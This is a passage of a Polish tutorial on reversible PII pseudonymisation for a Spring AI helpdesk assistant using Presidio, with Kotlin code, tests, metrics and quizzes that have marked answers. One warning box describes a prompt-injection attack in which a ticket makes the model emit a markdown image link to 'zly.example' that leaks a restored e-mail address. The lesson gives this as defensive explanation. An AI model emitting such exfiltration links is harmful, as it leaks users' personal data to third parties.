+  /** Nazwy znaczników z kontraktu M2: <EMAIL_1>, <PHONE_1>, <PL_PESEL_1>. */
+  fun placeholderType(entity: String) =
+      mapOf("EMAIL_ADDRESS" to "EMAIL", "PHONE_NUMBER" to "PHONE", "IBAN_CODE" to "IBAN")[entity] ?: entity
+</script>
+<div class="box bug"><span class="label">Pułapka: emoji przesuwa znaczniki</span><p>W Pythonie pozycja to numer znaku Unicode, w Kotlinie jednostka UTF-16, a emoji zajmuje dwie. W „👋 Mój PESEL 92031501232” bez <code>offsetByCodePoints</code> znacznik zje spację przed numerem, a w prompcie zostanie ostatnia cyfra. Test z emoji przed danymi osobowymi jest obowiązkowy.</p></div>
+<p>Każdy błąd (timeout, 5xx, otwarty breaker) to jeden wyjątek, bo znaczy to samo: nie wiemy, co jest w tekście. Bez retry, bo podwoiłby opóźnienie. Tagi metryk mają niską <dfn data-t="cardinality">kardynalność</dfn>.</p>
+
+<h2>Pseudonimizacja odwracalna i spójne mapowanie</h2>
+<p>Przy redakcji każdego tekstu osobno <code>&lt;PERSON_1&gt;</code> w pytaniu i <code>&lt;PERSON_1&gt;</code> w wyniku narzędzia mogłyby oznaczać różne osoby, a model połączyłby fakty o dwóch ludziach. Dlatego mapowanie żyje w <code>PseudonymSession</code>, jednej na żądanie, wspólnej dla wiadomości, historii i rund narzędzi:</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/pii/PseudonymSession.kt">
+  class PseudonymSession {
+      private val byValue = HashMap<String, String>()              // "PERSON|zofia wiśniewska" → "<PERSON_1>"
+      private val byPlaceholder = LinkedHashMap<String, String>()  // "<PERSON_1>" → "Zofia Wiśniewska"
+      private val counters = HashMap<String, Int>()
+
+      @Synchronized
+      fun placeholderFor(type: String, original: String): String =
+          byValue.getOrPut("$type|${normalize(type, original)}") {
+              val n = (counters[type] ?: 0) + 1
+              counters[type] = n
+              "<${type}_$n>".also { byPlaceholder[it] = original }
+          }
+
+      @Synchronized fun original(placeholder: String): String? = byPlaceholder[placeholder]
+      @Synchronized fun snapshot(): Map<String, String> = LinkedHashMap(byPlaceholder)
+
+      private fun normalize(type: String, s: String): String = when (type) {
+          "PHONE" -> s.filter(Char::isDigit).takeLast(9)                     // +48 i spacje bez znaczenia
+          "PL_PESEL", "PL_NIP", "IBAN" -> s.filter(Char::isLetterOrDigit).uppercase()
+          else -> s.trim().lowercase().replace(Regex("""\s+"""), " ")      // PERSON, EMAIL, ...
+      }
+  }
+</script>
+<p>Dzięki normalizacji „+48 601 000 111” i „601000111” to ten sam <code>&lt;PHONE_1&gt;</code>; odmiany nazwisk nadal dostaną osobne znaczniki.</p>
+<h3>Spójność między turami rozmowy</h3>
+<p>Historia z <code>ConversationStore</code> (2.5) jest zapisana w oryginale i przy każdym pytaniu redagowana od początku w tej samej kolejności, więc numeracja jest stabilna. Gdy okno historii się przesunie, numeracja może się zmienić: prompt nadal jest spójny, ale zmienia się jego początek, co psuje <dfn data-t="prompt-caching">prompt caching</dfn> (2.4). Trwałe mapowanie per rozmowa (zaszyfrowana tabela) to stabilność kosztem nowego magazynu danych osobowych. Zacznij od wersji bezstanowej.</p>
+<h3>Odtwarzanie w odpowiedzi: tylko backend i tylko wybrane typy</h3>
+<p>Model odpowiada „Zgłoszenie założyła <code>&lt;PERSON_1&gt;</code>, kontakt: <code>&lt;EMAIL_1&gt;</code>”. Użytkownik i tak widzi te dane w zgłoszeniu, więc backend świadomie je odtwarza:</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/pii/PlaceholderRestorer.kt">
+  object PlaceholderRestorer {
+      val PATTERN = Regex("""<([A-Z_]+?)_(\d+)>""")
+      private val labels = mapOf("PL_PESEL" to "PESEL", "PL_NIP" to "NIP", "IBAN" to "numer konta",
+          "CREDIT_CARD" to "numer karty", "PL_ADDRESS" to "adres")
+
+      fun restore(text: String, session: PseudonymSession, allowedTypes: Set<String>): String =
+          PATTERN.replace(text) { m ->
+              val type = m.groupValues[1]
+              val original = session.original(m.value)
+              when {
+                  original == null -> "[nieznane dane]"            // model wymyślił znacznik
+                  type in allowedTypes -> original
+                  else -> "[${labels[type] ?: type} – zobacz w zgłoszeniu]"
+              }
+          }
+
+      /** Literalne znaczniki wpisane przez użytkownika neutralizujemy przed redakcją. */
+      fun neutralize(input: String): String = PATTERN.replace(input) { "‹${it.groupValues[1]}_${it.groupValues[2]}›" }
+  }
+</script>
+<div class="box warn"><span class="label">Ryzyka odtwarzania</span><ul>
+  <li><strong>Błędne przypisanie wygląda wiarygodnie.</strong> Fakt przypisany złemu znacznikowi po odtworzeniu pokaże prawdziwe nazwisko przy cudzej sprawie. Znaczniki nie usuwają <dfn data-t="hallucination">halucynacji</dfn>.</li>
+  <li><strong>Eksfiltracja przez link.</strong> <dfn data-t="prompt-injection">Prompt injection</dfn> w zgłoszeniu może wywołać odpowiedź <code>![](https://zly.example/?d=&lt;EMAIL_1&gt;)</code>; po odtworzeniu i wyrenderowaniu markdownu przeglądarka wyśle e-mail na obcy serwer. Renderuj odpowiedzi bez zdalnych obrazów, z białą listą domen linków (3.4).</li>
+  <li><strong>Wpisany znacznik.</strong> „Co wiesz o <code>&lt;PERSON_3&gt;</code>?” – <code>neutralize</code> usuwa niejednoznaczność.</li>
+  <li><strong>Identyfikatory wrażliwe.</strong> PESEL i numer konta nie wracają nawet do uprawnionego agenta; zobaczy je w zgłoszeniu, gdzie dostęp jest audytowany.</li>
+</ul></div>
+
+<h2>Gdzie wpiąć redakcję: advisor, narzędzia, serwis</h2>
+<p>Prompt rośnie w trzech miejscach: serwis dokłada historię i pytanie, kolejne rundy dokładają wyniki narzędzi, a na końcu wraca odpowiedź. Każde wymaga innego punktu zaczepienia.</p>
+<h3>Advisor dla wiadomości i historii</h3>
+<p><dfn data-t="advisor">Advisor</dfn> w Spring AI 1.x implementuje <code>CallAdvisor</code> (<code>adviseCall(ChatClientRequest, CallAdvisorChain)</code>) i/lub <code>StreamAdvisor</code> (<code>adviseStream(…)</code>). <code>ChatClientRequest</code> niesie <code>prompt()</code> i <code>context()</code> z parametrami z <code>.advisors { it.param(…) }</code>. Niższy <code>getOrder()</code> działa wcześniej, więc nasz stoi blisko końca łańcucha, po advisorach dokładających historię.</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/pii/PiiRedactionAdvisor.kt">
+  class PiiRedactionAdvisor(private val redactor: PiiRedactor) : CallAdvisor, StreamAdvisor {
+
+      override fun getName() = "PiiRedactionAdvisor"
+      override fun getOrder() = Ordered.LOWEST_PRECEDENCE - 1000
+
+      override fun adviseCall(req: ChatClientRequest, chain: CallAdvisorChain): ChatClientResponse =
+          chain.nextCall(redact(req))
+
+      override fun adviseStream(req: ChatClientRequest, chain: StreamAdvisorChain): Flux<ChatClientResponse> =
+          Mono.fromCallable { redact(req) }
+              .subscribeOn(Schedulers.boundedElastic())      // HTTP do Presidio jest blokujący
+              .flatMapMany(chain::nextStream)
+
+      private fun redact(req: ChatClientRequest): ChatClientRequest {
+          val decision = req.context()[POLICY] as? PiiDecision
+              ?: throw IllegalStateException("Brak decyzji PII w kontekście – odmawiamy wysłania")
+          if (!decision.redactPrompt) return req
+          val ctx = RedactionContext(decision.tenantId, RedactionPurpose.LLM_PROMPT,
+              req.context()[SESSION] as PseudonymSession)
+          fun r(text: String?) = redactor.redact(PlaceholderRestorer.neutralize(text.orEmpty()), ctx).text
+
+          val messages = req.prompt().instructions.map { m ->
+              when (m) {
+                  is UserMessage -> UserMessage(r(m.text))
+                  is AssistantMessage -> AssistantMessage(r(m.text))   // historia: tylko tekst (2.5)
+                  else -> m                                      // SYSTEM: nasz prompt z repozytorium
+              }
+          }
+          return req.mutate().prompt(Prompt(messages, req.prompt().options)).build()
+      }
+
+      companion object {
+          const val POLICY = "helpdesk.pii.decision"
+          const val SESSION = "helpdesk.pii.session"
+      }
+  }
+</script>
+<p>Konstruktory wiadomości bywają w nowszych wersjach 1.x zastępowane builderami; sprawdź API swojej wersji. Jeśli historia zawiera <code>ToolResponseMessage</code>, redaguj też jej odpowiedzi. Prompt systemowy (2.4) nie zawiera danych użytkownika, więc zostaje bez zmian.</p>
+<h3>Wyniki i argumenty narzędzi</h3>
+<p>W domyślnym trybie Spring AI 1.x wykonuje narzędzia wewnątrz wywołania modelu, więc kolejne rundy nie przechodzą ponownie przez advisory, a wynik <code>listComments</code> poszedłby do dostawcy bez redakcji (sprawdź zachowanie swojej wersji). Redagujemy więc na granicy narzędzia, dekorując <code>ToolCallback</code>, i to w obie strony: model może poprosić o <code>searchTickets(query = "&lt;PERSON_1&gt;")</code>, więc znaczniki w argumentach odtwarzamy przed wykonaniem.</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/pii/RedactingToolCallback.kt">
+  class RedactingToolCallback(
+      private val delegate: ToolCallback,
+      private val redactor: PiiRedactor,
+      private val json: ObjectMapper,
+  ) : ToolCallback {
+
+      override fun getToolDefinition() = delegate.toolDefinition
+      override fun getToolMetadata() = delegate.toolMetadata
+      override fun call(toolInput: String): String = error("Narzędzia asystenta wymagają ToolContext")
+
+      override fun call(toolInput: String, toolContext: ToolContext?): String {
+          val values = toolContext?.context ?: error("Brak ToolContext")
+          val assistant = values[AssistantToolContext.KEY] as AssistantToolContext
+          val session = values[PII_SESSION] as PseudonymSession?
+          if (session == null) {
+              check(!assistant.route.external) { "Trasa zewnętrzna bez sesji PII" }   // fail closed w kodzie
+              return delegate.call(toolInput, toolContext)
+          }
+          val output = delegate.call(restoreArguments(toolInput, session), toolContext)
+          return redactor.redact(output,
+              RedactionContext(assistant.tenantId, RedactionPurpose.TOOL_RESULT, session)).text
+      }
+
+      /** Odtwarzanie na poziomie węzłów JSON – wstawienie surowego tekstu z cudzysłowem zepsułoby JSON. */
+      private fun restoreArguments(input: String, session: PseudonymSession): String {
+          val node = json.readTree(input) as? ObjectNode ?: return input
+          node.fields().forEach { (k, v) ->
+              if (v.isTextual) node.put(k, PlaceholderRestorer.PATTERN.replace(v.asText()) {
+                  session.original(it.value) ?: it.value
+              })
+          }
+          return json.writeValueAsString(node)
+      }
+
+      companion object { const val PII_SESSION = "pii" }
+  }
+</script>
+<p>NER radzi sobie z JSON-em gorzej niż z prozą. Lepiej redagować wartości pól tekstowych (<code>description</code>, <code>body</code>) przed serializacją, a dekorator zostawić jako siatkę bezpieczeństwa.</p>
+<h3>Serwis: decyzja, sesja, odtworzenie</h3>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/AssistantChatService.kt (fragment)">
+  data class PiiDecision(val tenantId: UUID, val redactPrompt: Boolean, val restoreTypes: Set<String>)
+
+  // PiiPolicy.decide: redactPrompt = route.external || tenantId in props.alwaysRedactTenants
+  // w chat(user, req), po tenants.get → availability.require → router.route → limiter:
+  val decision = piiPolicy.decide(req.tenantId, route)
+  val session = PseudonymSession().takeIf { decision.redactPrompt }
+
+  val raw = clients.forRoute(route).prompt()
+      .messages(history)                                         // oryginały z ConversationStore
+      .user(req.message)
+      .toolCallbacks(*redactingTools)                            // TicketReadTools w RedactingToolCallback
+      .toolContext(buildMap {
+          put("assistant", AssistantToolContext(user, req.tenantId, route, conversationId))
+          session?.let { put(RedactingToolCallback.PII_SESSION, it) }
+      })
+      .advisors { a ->
+          a.param(PiiRedactionAdvisor.POLICY, decision)
+          session?.let { a.param(PiiRedactionAdvisor.SESSION, it) }
+      }
+      .call().content().orEmpty()
+
+  val answer = session?.let { PlaceholderRestorer.restore(raw, it, decision.restoreTypes) } ?: raw
+</script>
+<p><code>redactingTools</code> to <code>MethodToolCallbackProvider.builder().toolObjects(ticketReadTools).build().toolCallbacks</code> w dekoratorze. Advisor rejestrujemy w <code>AiClients</code> przez <code>defaultAdvisors(...)</code>.</p>
+
+<h2>Fail closed: gdy Presidio nie działa</h2>
+<p><dfn data-t="fail-closed">Fail closed</dfn> oznacza odmowę działania, gdy zabezpieczenie jest niedostępne; fail open przepuszcza ruch bez niego. Dla trasy zewnętrznej jedyna poprawna opcja to fail closed: lepiej chwilowo niedostępny asystent niż PESEL u dostawcy, bo „Presidio miało timeout”. Na trasie lokalnej bez obowiązkowej redakcji awaria Presidio blokuje tylko zapis treści do trace'ów.</p>
+<script type="text/x-code" data-lang="kotlin" data-title="AiAvailability.kt i ApiExceptionHandler.kt (rozszerzenie z 1.5)">
+  // AiAvailability.status(tenantId) – nowa gałąź przed AVAILABLE:
+  // breaker "presidio" blokuje tylko tenantów z trasą zewnętrzną
+  settings.externalLlmAllowed && presidioBreaker.state == CircuitBreaker.State.OPEN ->
+      AiStatus.TEMPORARILY_UNAVAILABLE
+
+  @ExceptionHandler(PiiRedactionUnavailableException::class)   // ApiExceptionHandler
+  fun piiUnavailable(e: PiiRedactionUnavailableException) =
+      ProblemDetail.forStatusAndDetail(HttpStatus.SERVICE_UNAVAILABLE, "Asystent jest chwilowo niedostępny.").apply {
+          type = URI.create("https://helpdesk.example/problems/assistant-unavailable")
+          setProperty("reason", "PII_GUARD_UNAVAILABLE")
+      }
+</script>
+<div class="box warn"><span class="label">Pułapka: wyjątek połknięty po drodze</span><p>Jeśli handler błędów narzędzi zamienia wyjątki na <code>ToolResult.Error(UNAVAILABLE, …)</code> (2.1), <code>PiiRedactionUnavailableException</code> musi być wyjątkiem od tej reguły i przerywać całe żądanie, a nie stać się komunikatem dla modelu. Test z zatrzymanym kontenerem Presidio wykrywa to od razu.</p></div>
+<p>Presidio staje się zależnością krytyczną: dwie repliki, alert na otwarty breaker, aktualizacje przez staging z testem zbioru PII.</p>
+
+<h2>Streaming: znaczniki rozcięte między fragmentami</h2>
+<p>Przy <dfn data-t="streaming">streamingu</dfn> (2.3) granice fragmentów wyznacza tokenizer modelu, nie nasze znaczniki: <code>&lt;PERSON_1&gt;</code> może przyjść jako <code>"&lt;PER"</code>, <code>"SON_"</code>, <code>"1&gt; zgłosiła"</code>. Odtwarzanie fragmentów osobno nic nie znajdzie. Rozwiązanie: wstrzymujemy tekst od ostatniego <code>&lt;</code>, dopóki nie przyjdzie <code>&gt;</code> albo bufor nie przekroczy długości znacznika.</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/pii/StreamingRestorer.kt">
+  class StreamingRestorer(
+      private val restore: (String) -> String,
+      private val maxPlaceholderLength: Int = 32,
+  ) {
+      private val buffer = StringBuilder()
+
+      fun feed(chunk: String): String {
+          buffer.append(chunk)
+          val open = buffer.lastIndexOf("<")
+          val cut = when {
+              open == -1 -> buffer.length
+              buffer.indexOf(">", open) != -1 -> buffer.length              // znacznik domknięty
+              buffer.length - open > maxPlaceholderLength -> buffer.length  // to nie znacznik, np. "a < b"
+              else -> open                                                  // czekamy na resztę
+          }
+          val ready = buffer.substring(0, cut)
+          buffer.delete(0, cut)
+          return restore(ready)
+      }
+
+      fun flush(): String = restore(buffer.toString()).also { buffer.setLength(0) }
+  }
+
+  // w stream(user, req) – po stronie backendu, przed wysłaniem SSE
+  val restorer = StreamingRestorer { PlaceholderRestorer.restore(it, session, decision.restoreTypes) }
+  chatFlux
+      .map(restorer::feed)
+      .concatWith(Mono.fromCallable(restorer::flush))
+      .filter { it.isNotEmpty() }
+      .map { ServerSentEvent.builder(it).event("delta").build() }
+</script>
+<p>Opóźnienie to najwyżej kilkadziesiąt znaków (<dfn data-t="ttft">TTFT</dfn> może wzrosnąć o jeden fragment). Mapowanie nie trafia do przeglądarki: byłoby kolejną kopią danych poza Twoją kontrolą.</p>
+
+<h2>Trace, logi, LiteLLM i evale</h2>
+<h3>Trace</h3>
+<p>Filtr <code>ChatContentObservationFilter</code> z 1.4 czyta prompt z <code>ChatModelObservationContext</code>, czyli po advisorze: dla trasy zewnętrznej treść w <dfn data-t="trace">trace</dfn> jest już zredagowana, a odpowiedź zawiera znaczniki. Luki to trasa lokalna i atrybuty narzędzi (argumenty po odtworzeniu). Zmiana w filtrze:</p>
+<script type="text/x-code" data-lang="kotlin" data-title="ChatContentObservationFilter.kt (zmiana)">
+  // trasa lokalna: redakcja nieodwracalna (mapowanie wyrzucone);
+  // awaria Presidio = brak treści w trace, a nie treść bez redakcji
+  val prompt = if (route?.external == true) rawPrompt
+      else runCatching { redactor.redact(rawPrompt, RedactionContext(tenant, OBSERVABILITY)).text }
+          .getOrNull() ?: return context
+</script>
+<p>Treść narzędzi w spanach wyłącz (<code>spring.ai.tools.observations.include-content: false</code>) i usuwaj w <dfn data-t="otel-collector">Collectorze</dfn> jak w 1.4. Regexowy procesor <code>redaction</code> to ostatnia siatka, nie główna obrona.</p>
+<h3>Logi aplikacji</h3>
+<p>Treść nie trafia do logów; logujesz identyfikatory i <code>traceId</code>. Siatką jest tani konwerter Logbacka maskujący oczywiste wzorce (e-mail, 11 cyfr, IBAN). Uważaj na wyjątki: <code>MethodArgumentNotValidException</code> zawiera odrzuconą wartość pola, czyli wiadomość użytkownika.</p>
+<h3>LiteLLM: guardrail Presidio w proxy</h3>
+<p>LiteLLM ma wbudowane <dfn data-t="guardrails">guardrails</dfn> z Presidio: guardrail z <code>guardrail: presidio</code> i trybem <code>pre_call</code> (maskowanie przed dostawcą), <code>post_call</code> albo <code>logging_only</code> (tylko w logach i callbackach). Adresy usług w <code>PRESIDIO_ANALYZER_API_BASE</code> i <code>PRESIDIO_ANONYMIZER_API_BASE</code>, język w <code>presidio_language</code>, a <code>output_parse_pii</code> odtwarza wartości w odpowiedzi. Szczegóły sprawdź w dokumentacji swojej wersji.</p>
+<table>
+  <tr><th>Kryterium</th><th>Redakcja w aplikacji (ta lekcja)</th><th>Guardrail w LiteLLM</th></tr>
+  <tr><td>Polityka per tenant</td><td>Pełna: zna <code>route.external</code>, rolę, tenanta</td><td>Per klucz lub żądanie; tenanta zna tylko, jeśli go przekażesz</td></tr>
+  <tr><td>Spójność z narzędziami</td><td>Jedna sesja na wiadomość, historię i rundy narzędzi; argumenty odtwarzane przed wykonaniem</td><td>Argumenty narzędzi wracają do aplikacji ze znacznikami, których mapowania aplikacja nie zna</td></tr>
+  <tr><td>Fail closed</td><td>Jawnie w kodzie, z testem</td><td>Zależy od zachowania proxy; przetestuj</td></tr>
+</table>
+<p>W HelpDesk główna redakcja jest w aplikacji; guardrail w proxy to druga warstwa dla klientów bez własnej redakcji albo <code>logging_only</code> dla callbacków.</p>
+<h3>Eksport do evali</h3>
+<p>Zbiór <code>cases.yaml</code> z 2.8 żyje w repozytorium: najszerszy dostęp i wieczna retencja (historia Gita). Przypadki z produkcji eksportujesz tylko narzędziem, które redaguje nieodwracalnie (<code>RedactionPurpose.EVAL_EXPORT</code>, mapowanie wyrzucone) i zamienia znaczniki na fikcyjne, realistyczne wartości („Jan Testowy”, „500 000 001”), bo model zachowuje się inaczej wobec <code>&lt;PERSON_1&gt;</code> niż wobec nazwiska. Potem przegląd człowieka i test w CI, który przepuszcza <code>cases.yaml</code> przez analyzer i failuje na PESEL-u, IBAN-ie czy e-mailu spoza <code>example.com</code>. Danych Globexu nie eksportujesz bez zgody tenanta.</p>
+
+<h2>Przypadki brzegowe</h2>
+<table>
+  <tr><th>Przypadek</th><th>Problem</th><th>Postępowanie</th></tr>
+  <tr><td>Nazwa pliku: <code>korekta_Zofia_Wisniewska_92031501232.pdf</code></td><td>NER nie widzi osoby; <code>\b</code> w regexie PESEL-u nie zadziała, bo <code>_</code> to znak słowa</td><td>Zamieniaj <code>_</code> i <code>-</code> na spacje przed analizą; najlepiej wysyłaj do modelu tylko typ i rozmiar pliku</td></tr>
+  <tr><td>URL: <code>…/reset?email=zofia.w%40example.com</code></td><td>E-mail zakodowany; encja <code>URL</code> zredagowałaby cały link</td><td>Dekoduj URL przed analizą; nie dodawaj <code>URL</code> do <code>entities</code></td></tr>
+  <tr><td>Wklejony stack trace</td><td>Hasła w connection stringach, klasy brane za nazwiska (<code>KowalskiImportService</code>)</td><td>Kod tylko wzorcami, bez NER; własne recognizery sekretów (Presidio nie jest skanerem sekretów)</td></tr>
+  <tr><td>Pracownicy a klienci</td><td>„Piotr z supportu” to też dana osobowa</td><td>Redaguj wszystkie osoby; allow-lista imion agentów tylko po decyzji IOD</td></tr>
+  <tr><td>„Podaj PESEL klienta z HD-1042”</td><td>Agent ma dostęp do zgłoszenia, ale czat to zły kanał na identyfikatory</td><td>Model widzi <code>&lt;PL_PESEL_1&gt;</code>, backend zwraca „[PESEL – zobacz w zgłoszeniu]”</td></tr>
+  <tr><td>Odmiana</td><td>Odtworzenie ma formę z pierwszego wystąpienia: „przekazałem sprawę Zofia Wiśniewska”</td><td>Akceptowalne; poproś model, by nie odmieniał znaczników</td></tr>
+</table>
+
+<h2>Jakość: precision, recall i testy</h2>
+<p>Redakcja to klasyfikator. <dfn data-t="precision-recall">Precision</dfn> to odsetek znalezisk, które naprawdę są danymi osobowymi (niska: zredagowane miasta i produkty, gorsze odpowiedzi). Recall to odsetek danych osobowych, które znaleziono (niski: wyciek). Liczysz je per typ encji, bo średnia ukryje, że PESEL ma 100%, a nazwiska 70%. Potrzebny jest zbiór 200–500 polskich zdań w stylu zgłoszeń, z oznaczonymi zakresami, fikcyjnymi danymi i celowymi pułapkami:</p>
+<script type="text/x-code" data-lang="yaml" data-title="src/test/resources/pii/pl-cases.yaml">
+  - text: "Proszę o kontakt z p. Zofią Wiśniewską, tel. 601 000 111."
+    expect: [{ type: PERSON, value: "Zofią Wiśniewską" }, { type: PHONE, value: "601 000 111" }]
+  - text: "PESEL 92031501232, NIP firmy 123-456-32-18"
+    expect: [{ type: PL_PESEL, value: "92031501232" }, { type: PL_NIP, value: "123-456-32-18" }]
+  - text: "Zamówienie 1234563218 utknęło w Krakowie"     # liczba spełnia sumę NIP, ale bez kontekstu
+    expect: []
+  - text: "Moduł Acme Ledger nie liczy VAT od 1 maja, dotyczy HD-1042"
+    expect: []                                          # produkt, data, numer zgłoszenia
+  - text: "👋 mail: zofia.w@example.com"                # emoji: test offsetów
+    expect: [{ type: EMAIL, value: "zofia.w@example.com" }]
+  - text: "zadzwon do kasi nowak 601000111"            # styl nieformalny
+    expect: [{ type: PERSON, value: "kasi nowak" }, { type: PHONE, value: "601000111" }]
+</script>
+<p>Proponowane progi przed każdą zmianą konfiguracji lub obrazu: recall 100% dla PESEL, IBAN i e-maila, co najmniej 90% dla telefonów i 85% dla osób, precision dla osób co najmniej 80%. Przy niskim recall osób nie obniżaj progu na ślepo; popraw allow-listę i słowa kontekstowe.</p>
+<h3>Testy</h3>
+<p>Walidatory recognizerów testujesz w Pythonie (pytest) wprost przez <code>validate_result</code>: poprawny PESEL z lat 90. i z 2000+ (miesiąc +20), zła suma, 31 lutego, NIP z poprawną sumą zwracający <code>None</code>. Całość z perspektywy aplikacji sprawdza test integracyjny:</p>
+<script type="text/x-code" data-lang="kotlin" data-title="PresidioPiiRedactorIT.kt">
+  @SpringBootTest
+  @Testcontainers
+  class PresidioPiiRedactorIT(@Autowired val redactor: PiiRedactor) {
+
+      companion object {
+          @Container @JvmStatic
+          val analyzer: GenericContainer<*> = GenericContainer(DockerImageName.parse("helpdesk/presidio-analyzer-pl:test"))
+              .withExposedPorts(3000)
+              .waitingFor(Wait.forHttp("/health").forStatusCode(200).withStartupTimeout(Duration.ofMinutes(2)))
+
+          @DynamicPropertySource @JvmStatic
+          fun props(r: DynamicPropertyRegistry) {
+              r.add("helpdesk.pii.analyzer-url") { "http://${analyzer.host}:${analyzer.getMappedPort(3000)}" }
+          }
+      }
+
+      private fun ctx(s: PseudonymSession = PseudonymSession()) = RedactionContext(ACME, RedactionPurpose.LLM_PROMPT, s)
+
+      @Test
+      fun `redaguje PESEL i telefon, zostawia numer zgloszenia`() {
+          val r = redactor.redact("HD-1042: PESEL 92031501232, tel. 601 000 111", ctx())
+          assertThat(r.text).isEqualTo("HD-1042: PESEL <PL_PESEL_1>, tel. <PHONE_1>")
+      }
+
+      @Test
+      fun `niedzialajace Presidio daje wyjatek, a nie tekst bez redakcji`() {
+          analyzer.dockerClient.pauseContainerCmd(analyzer.containerId).exec()
+          try {
+              assertThrows<PiiRedactionUnavailableException> { redactor.redact("PESEL 92031501232", ctx()) }
+          } finally {
+              analyzer.dockerClient.unpauseContainerCmd(analyzer.containerId).exec()
+          }
+      }
+  }
+</script>
+<p>Testcontainers uruchamia na czas testów ten sam obraz, który wdrażasz (start z modelem spaCy trwa do kilkudziesięciu sekund, więc kontener jest współdzielony). Dołóż test z mockiem <code>ChatModel</code> (jak w 1.2), który sprawdza, że prompt na trasę zewnętrzną nie zawiera żadnej wartości z <code>pl-cases.yaml</code>, także w wynikach narzędzi z drugiej rundy. Te przypadki trafiają też do kategorii PII w evalach z 2.8.</p>
+
+<h2>Metryki i wydajność</h2>
+<table>
+  <tr><th>Metryka</th><th>Typ i tagi</th><th>Po co</th></tr>
+  <tr><td><code>helpdesk.pii.redactions</code></td><td>Counter: <code>entity</code>, <code>purpose</code></td><td>Spadek do zera po wdrożeniu = model spaCy się nie załadował; skok <code>PERSON</code> = fałszywe pozytywy</td></tr>
+  <tr><td><code>helpdesk.pii.redaction.duration</code></td><td>Timer: <code>purpose</code></td><td>p95 w budżecie czasu żądania</td></tr>
+  <tr><td><code>helpdesk.pii.failures</code></td><td>Counter: <code>purpose</code></td><td>Alert: na trasie zewnętrznej to odmowa obsługi</td></tr>
+</table>
+<p>Rząd wielkości na CPU (ilustracyjny, zmierz u siebie): wiadomość 300–500 znaków to kilkanaście–kilkadziesiąt ms, wynik narzędzia 8 000 znaków ok. 100–300 ms, a całe pytanie z dwiema rundami narzędzi zwykle 0,2–0,8 s narzutu przy kilku sekundach pracy modelu.</p>
+<p>Pomaga batch (pole <code>text</code> przyjmuje listę, więc historia i wiadomość idą jednym żądaniem), cache zakresów znalezisk dla niezmiennej historii, skalowanie replikami (każdy worker ładuje własną kopię modelu, kilkaset MB) i readiness probe wołająca <code>/analyze</code>, bo pierwsze wywołanie jest wolne.</p>
+<p>Znacznik <code>&lt;PL_PESEL_1&gt;</code> to kilka <dfn data-t="token">tokenów</dfn>, tyle co sam numer, więc redakcja nie zmienia kosztu wywołania modelu.</p>
+
+<div class="box tip"><span class="label">Ćwiczenie</span><ol>
+  <li>Zbuduj obraz <code>helpdesk/presidio-analyzer-pl</code>, sprawdź <code>GET /recognizers?language=pl</code> i przepuść przez <code>/analyze</code> przypadki z <code>pl-cases.yaml</code>. Znajdź fałszywy pozytyw i usuń go allow-listą lub słowami kontekstowymi.</li>
+  <li>Dopisz recognizer numeru dowodu osobistego (trzy litery, sześć cyfr, suma kontrolna na wagach 7, 3, 1) z testem pytest.</li>
+  <li>Napisz test z mockiem <code>ChatModel</code>: użytkownik Acme pyta o HD-1042, którego komentarz zawiera fikcyjny e-mail i PESEL. Prompt z drugiej rundy nie może ich zawierać, a odpowiedź ma mieć odtworzony e-mail i „[PESEL – zobacz w zgłoszeniu]”.</li>
+  <li>Zatrzymaj Presidio: czat Acme ma zwrócić 503 z <code>reason = PII_GUARD_UNAVAILABLE</code>, a podsumowanie zgłoszenia Globexu na <code>helpdesk-local</code> działać dalej, bez treści w trace.</li>
+</ol></div>
+
+<h2>Sprawdź się</h2>
+<div class="quiz" data-id="q1" data-correct="2">
+  <p class="q">Gdzie w asystencie HelpDesk pojawia się najwięcej danych osobowych, które trafiają do promptu?</p>
+  <button>W prompcie systemowym</button>
+  <button>W argumentach narzędzi generowanych przez model</button>
+  <button>W wynikach narzędzi: treści zgłoszeń i komentarzy</button>
+  <button>W nazwie aliasu modelu</button>
+  <p class="explain">Pytanie często nie zawiera danych osobowych, a wynik <code>listComments</code> ma podpisy, e-maile i telefony. Advisor tego nie obejmie, bo rundy narzędzi nie przechodzą ponownie przez łańcuch advisorów; stąd dekorator <code>ToolCallback</code>.</p>
+</div>
+<div class="quiz" data-id="q2" data-correct="0">
+  <p class="q">Presidio ma timeout przy redakcji wiadomości użytkownika Acme (trasa zewnętrzna). Co powinien zrobić backend?</p>
+  <button>Odmówić obsługi (503, asystent chwilowo niedostępny), nie wysyłając tekstu do modelu</button>
+  <button>Wysłać wiadomość bez redakcji, bo Acme ma umowę powierzenia z dostawcą</button>
+  <button>Ponawiać wywołanie Presidio aż do skutku</button>
+  <button>Przełączyć rozmowę na <code>helpdesk-default-backup</code></button>
+  <p class="explain">Fail closed. Umowa powierzenia nie znosi minimalizacji, ponawianie zjada budżet czasu, a model zapasowy to nadal zewnętrzny dostawca.</p>
+</div>
+<div class="quiz" data-id="q3" data-correct="3">
+  <p class="q">Dlaczego do pseudonimizacji promptu wołamy tylko analyzer, a zamianę na <code>&lt;PERSON_1&gt;</code> robimy w Kotlinie?</p>
+  <button>Bo anonymizer nie działa z językiem polskim</button>
+  <button>Bo anonymizer jest płatny</button>
+  <button>Bo analyzer od razu zwraca tekst ze znacznikami</button>
+  <button>Bo potrzebujemy numerowanych, spójnych znaczników i mapowania w pamięci backendu, czego operatory REST anonymizera nie dają</button>
+  <p class="explain"><code>replace</code> wstawia stałą wartość, a <code>custom</code> działa tylko w bibliotece Pythona. Spójna numeracja i odtwarzanie wymagają własnej <code>PseudonymSession</code>.</p>
+</div>
+<div class="quiz" data-id="q4" data-correct="1">
+  <p class="q">Odpowiedź modelu przychodzi strumieniem: <code>"Zgłosiła &lt;PER"</code>, <code>"SON_1&gt; wczoraj"</code>. Co się stanie przy odtwarzaniu każdego fragmentu osobno?</p>
+  <button>Nic złego, regex znajdzie znacznik w drugim fragmencie</button>
+  <button>Znacznik nie zostanie rozpoznany i użytkownik zobaczy go w surowej postaci; potrzebny jest bufor wstrzymujący tekst od ostatniego <code>&lt;</code></button>
+  <button>Przeglądarka sama złoży fragmenty i odtworzy dane</button>
